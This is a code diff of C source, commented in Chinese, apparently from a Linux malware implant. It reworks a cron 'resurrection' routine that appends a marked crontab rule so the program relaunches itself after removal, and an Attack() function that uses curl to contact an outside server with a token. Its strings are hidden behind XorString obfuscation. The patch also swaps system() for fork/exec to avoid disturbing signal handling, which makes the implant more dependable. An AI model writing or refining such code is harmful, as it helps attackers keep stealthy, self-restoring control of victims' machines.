@@ -81,22 +81,53 @@ static void backup_self()
 static void install_cron_resurrect()
 {
     /* 检查 crontab 里是否已有我们的标记 */
-    FILE *fp = popen(XorString("crontab -l 2>/dev/null"), "r");
-    if (fp)
+    /* 用 fork+exec+pipe 替代 popen，避免 popen 修改 SIGCHLD */
+    int pipefd[2];
+    if (pipe(pipefd) < 0) return;
+
+    pid_t chk = fork();
+    if (chk == 0)
+    {
+        close(pipefd[0]);
+        dup2(pipefd[1], STDOUT_FILENO);
+        close(pipefd[1]);
+        execl(XorString("/bin/sh"), "sh", "-c", XorString("crontab -l 2>/dev/null"), NULL);
+        _exit(127);
+    }
+    close(pipefd[1]);
+
+    int found = 0;
+    if (chk > 0)
     {
         char line[512];
-        while (fgets(line, sizeof(line), fp))
+        FILE *fp = fdopen(pipefd[0], "r");
+        if (fp)
         {
-            if (strstr(line, XorString("#XSH_CRON")))
+            while (fgets(line, sizeof(line), fp))
             {
-                pclose(fp);
-                return; /* 已安装，不重复添加 */
+                if (strstr(line, XorString("#XSH_CRON")))
+                {
+                    found = 1;
+                    break;
+                }
             }
+            fclose(fp); /* 也关闭 pipefd[0] */
         }
-        pclose(fp);
+        else
+        {
+            close(pipefd[0]);
+        }
+        /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
+    }
+    else
+    {
+        close(pipefd[0]);
     }
 
-    /* 构建 crontab 命令：保留现有条目 + 追加复活规则 */
+    if (found)
+        return; /* 已安装，不重复添加 */
+
+    /* 构建 crontab 命令：用 fork+exec 替代 system()，不触碰 SIGCHLD */
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
         "%s%s%s%s%s%s %s %s%s",
@@ -109,7 +140,16 @@ static void install_cron_resurrect()
         XorString(GHOST_MAGIC),
         XorString(" #XSH_CRON"),
         XorString("') | crontab -"));
-    system(cmd);
+
+    pid_t p = fork();
+    if (p == 0)
+    {
+        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
+        _exit(127);
+    }
+    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
+    /* 等一小会让 crontab 写完 */
+    usleep(500000);
 }
 
 /*
@@ -553,7 +593,13 @@ void Attack()
     strcpy(cmd, XorString("curl "));
     strcat(cmd, XorString(AUTH_SERVER));
     strcat(cmd, XorString(TOKEN));
-    system(cmd);
+    pid_t p = fork();
+    if (p == 0)
+    {
+        execl(XorString("/bin/sh"), "sh", "-c", cmd, NULL);
+        _exit(127);
+    }
+    /* 不 waitpid，SIGCHLD=SIG_IGN 自动回收 */
 }
 
 void guard_main(int my_idx, char **argv);
